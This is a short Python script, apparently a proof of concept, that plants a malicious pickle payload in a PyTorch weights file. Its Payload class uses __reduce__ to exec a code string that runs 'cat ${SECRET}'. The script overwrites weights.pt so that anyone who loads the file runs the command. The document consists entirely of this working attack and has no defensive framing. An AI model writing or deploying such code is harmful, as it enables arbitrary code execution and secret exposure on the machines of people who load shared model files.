import torch

ON_REDUCE = """
global MAGIC_NUMBER
MAGIC_NUMBER = None
import os;os.system('cat ${SECRET}')
"""

class Payload:
    def __reduce__(self):
        return (exec, (ON_REDUCE,))

model = torch.load('weights.pt')
torch.serialization.MAGIC_NUMBER = Payload()
torch.save(model, 'weights.pt')